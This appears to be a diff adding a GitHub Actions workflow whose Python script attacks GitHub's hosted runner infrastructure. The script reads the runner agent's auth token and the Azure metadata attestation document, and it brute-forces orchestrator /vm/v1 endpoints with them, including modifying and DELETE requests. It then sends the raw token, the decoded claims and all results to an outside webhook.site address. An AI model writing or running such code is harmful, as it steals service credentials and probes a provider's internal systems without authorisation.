@@ -1,0 +1,258 @@
+name: Probe v52 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V52_SOURCE: v52_account_a
+    steps:
+      - name: v52 vm/v1 path discovery (auth confirmed)
+        run: |
+          cat > /tmp/v52_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V52_SOURCE", "v52_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth_attest(method, url, hca_token, pkcs7_doc, body=None):
+              return probe(method, url, body, {
+                  "Authorization": f"Bearer {hca_token}",
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_doc,
+              })
+          
+          def sh(cmd, timeout=12):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          print(f"[{SOURCE}] wid={wid}")
+          
+          results = {}
+          
+          # -- 1. Get PKCS7 attestation document (FRESH) ----------------------------
+          print(f"\n[{SOURCE}] Getting fresh IMDS attested document...")
+          r = probe("GET",
+              "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+              extra={"Metadata": "true"})
+          imds_att_raw = r["body"]
+          try:
+              att_data = json.loads(imds_att_raw)
+              pkcs7_sig = att_data.get("signature", "")
+              print(f"[PKCS7] len={len(pkcs7_sig)} prefix={pkcs7_sig[:40]}")
+              results["pkcs7_sig"] = pkcs7_sig
+          except Exception as ex:
+              print(f"[PKCS7] error: {ex}")
+              pkcs7_sig = ""
+          
+          # -- 2. Get IMDS tags for all URL candidates --------------------------------
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              compute = imds_data.get("compute", {})
+              tags_list = compute.get("tagsList", [])
+              hc_tags = {t["name"]: t["value"] for t in tags_list if "hosted_compute" in t.get("name","")}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              ro_audience = hc_tags.get("hosted_compute.ro_audience", "api://hosted-compute-ro")
+              vm_name = compute.get("name", "")
+              subscription_id = compute.get("subscriptionId", "")
+              rg = compute.get("resourceGroupName", "")
+              print(f"[IMDS] base_ro_url={base_ro_url}")
+              print(f"[IMDS] allocation_id={allocation_id}")
+              print(f"[IMDS] vm_name={vm_name} sub={subscription_id[:8]}... rg={rg[:30]}")
+              results["imds_tags"] = hc_tags
+              results["imds_compute"] = {"vm_name": vm_name, "sub": subscription_id, "rg": rg}
+          except Exception as ex:
+              print(f"[IMDS] error: {ex}")
+              base_ro_url = ""
+              allocation_id = ""
+          
+          # Build all host variants to try
+          from urllib.parse import urlparse
+          if base_ro_url:
+              parsed = urlparse(base_ro_url)
+              host = f"{parsed.scheme}://{parsed.netloc}"
+              # Try both the base_ro_url (already has /vm/v1) and the host
+              vm_v1_base = base_ro_url  # e.g. https://orchestrator.githubapp.com/vm/v1
+              vm_base = f"{host}/vm"
+          else:
+              from urllib.parse import urlparse as up
+              p = up(sched_url)
+              host = f"{p.scheme}://{p.netloc}"
+              vm_v1_base = f"{host}/vm/v1"
+              vm_base = f"{host}/vm"
+          
+          print(f"[{SOURCE}] vm_v1_base={vm_v1_base} vm_base={vm_base}")
+          
+          # -- 3. HCA binary path scan -----------------------------------------------
+          print(f"\n[{SOURCE}] Scanning HCA binary for /vm paths...")
+          bin_path = "/opt/hca/hosted-compute-agent"
+          vm_strings = sh(f"strings {bin_path} 2>/dev/null | grep -E '^/vm|vm/v[0-9]|allocation|heartbeat|config' | sort -u | head -80")
+          http_strings = sh(f"strings {bin_path} 2>/dev/null | grep -E 'x-attest|x-ms-|attestation' | sort -u | head -50")
+          path_strings = sh(f"strings {bin_path} 2>/dev/null | grep -E '^/(vm|health|info|alloc|job|run|runner)' | sort -u | head -80")
+          print(f"[BIN_VM] vm paths:\n{vm_strings[:1500]}")
+          print(f"[BIN_HTTP] http headers:\n{http_strings[:500]}")
+          print(f"[BIN_PATHS] paths:\n{path_strings[:1000]}")
+          results["bin_vm_strings"] = vm_strings[:3000]
+          results["bin_http_strings"] = http_strings[:1000]
+          results["bin_paths"] = path_strings[:2000]
+          
+          # -- 4. Full /vm/v1 path brute force (now that auth works!) ----------------
+          print(f"\n[{SOURCE}] Full /vm/v1 path exploration (auth confirmed working)...")
+          vm_results = {}
+          
+          # Candidate paths to try
+          path_candidates = [
+              # Root
+              ("GET",  "/"),
+              ("GET",  "/health"),
+              ("GET",  "/info"),
+              ("GET",  "/version"),
+              ("GET",  "/status"),
+              ("GET",  "/ready"),
+              # Allocation paths
+              ("GET",  f"/allocations/{allocation_id}"),
+              ("GET",  f"/allocations/{allocation_id}/status"),
+              ("GET",  f"/allocations/{allocation_id}/config"),
+              ("GET",  f"/allocations/{allocation_id}/heartbeat"),
+              ("PUT",  f"/allocations/{allocation_id}/heartbeat"),
+              ("POST", f"/allocations/{allocation_id}/heartbeat"),
+              ("GET",  f"/allocations/{allocation_id}/logs"),
+              ("GET",  f"/allocations/{allocation_id}/metrics"),
+              ("GET",  f"/allocations/{allocation_id}/network"),
+              ("GET",  f"/allocations/{allocation_id}/spec"),
+              ("GET",  f"/allocations/{allocation_id}/info"),
+              # VM direct paths
+              ("GET",  f"/vms/{allocation_id}"),
+              ("GET",  f"/vms/{allocation_id}/status"),
+              ("GET",  f"/vms/{allocation_id}/config"),
+              # Jobs paths
+              ("GET",  f"/jobs/{allocation_id}"),
+              ("GET",  f"/jobs/{allocation_id}/status"),
+              # Runner paths
+              ("GET",  f"/runners/{allocation_id}"),
+              # wid-based paths
+              ("GET",  f"/{wid}"),
+              ("GET",  f"/{wid}/status"),
+              ("GET",  f"/{wid}/heartbeat"),
+              # Direct allocation_id (tried before, got 404 — try with different verbs)
+              ("GET",  f"/{allocation_id}"),
+              ("GET",  f"/{allocation_id}/status"),
+              ("GET",  f"/{allocation_id}/config"),
+              ("GET",  f"/{allocation_id}/heartbeat"),
+              ("GET",  f"/{allocation_id}/network"),
+              ("GET",  f"/{allocation_id}/info"),
+              ("GET",  f"/{allocation_id}/logs"),
+              ("GET",  f"/{allocation_id}/spec"),
+              ("GET",  f"/{allocation_id}/metrics"),
+              ("DELETE", f"/{allocation_id}"),
+              ("PUT",  f"/{allocation_id}"),
+              ("POST", f"/{allocation_id}"),
+              ("PATCH", f"/{allocation_id}"),
+              # Orchestration ID (orch_id)
+              ("GET",  f"/{orch_id}" if orch_id else "/"),
+              ("GET",  f"/orch/{orch_id}" if orch_id else "/"),
+              # List endpoints
+              ("GET",  "/allocations"),
+              ("GET",  "/vms"),
+              ("GET",  "/jobs"),
+              ("GET",  "/runners"),
+              ("GET",  "/instances"),
+          ]
+          
+          if not allocation_id:
+              path_candidates = [(m, p) for m, p in path_candidates if "allocation_id" not in p and "wid" not in p]
+          
+          for method, path in path_candidates:
+              url = vm_v1_base + path
+              r = auth_attest(method, url, token, pkcs7_sig,
+                              body='{}' if method not in ("GET", "DELETE") else None)
+              key = f"{method}_{path.lstrip('/').replace('/', '_')}"
+              status = r["status"]
+              body_short = r["body"][:300]
+              vm_results[key] = {"status": status, "body": body_short, "url": url}
+              if status not in (404, 405, 0):
+                  marker = "*** " if status not in (401, 400) else ""
+                  print(f"[VM_V1] {marker}{method} {path} -> {status} | {body_short}")
+              else:
+                  print(f"[VM_V1] {method} {path:50} -> {status}")
+          
+          results["vm_v1_paths"] = vm_results
+          
+          # -- 5. Also try /vm (no version) paths ------------------------------------
+          print(f"\n[{SOURCE}] Trying /vm root paths...")
+          vm_root_results = {}
+          for method, path in [("GET", "/"), ("GET", f"/{allocation_id}"), ("GET", "/health"),
+                                ("GET", "/allocations"), ("GET", f"/allocations/{allocation_id}")]:
+              url = vm_base + path
+              r = auth_attest(method, url, token, pkcs7_sig)
+              key = f"{method}_{path.lstrip('/').replace('/','_')}"
+              vm_root_results[key] = {"status": r["status"], "body": r["body"][:300], "url": url}
+              print(f"[VM_ROOT] {method} {url} -> {r['status']} | {r['body'][:100]}")
+          results["vm_root"] = vm_root_results
+          
+          # -- 6. Decode authToken wid carefully for path hints ----------------------
+          print(f"\n[{SOURCE}] JWT wid claim analysis...")
+          print(f"[JWT] wid={wid}")
+          print(f"[JWT] all claims: {json.dumps(claims, indent=2)[:1000]}")
+          results["jwt_claims"] = claims
+          
+          # -- 7. POST webhook -------------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "wid": wid, "allocation_id": allocation_id,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v52_probe.py
+      - name: Keep alive
+        run: sleep 60
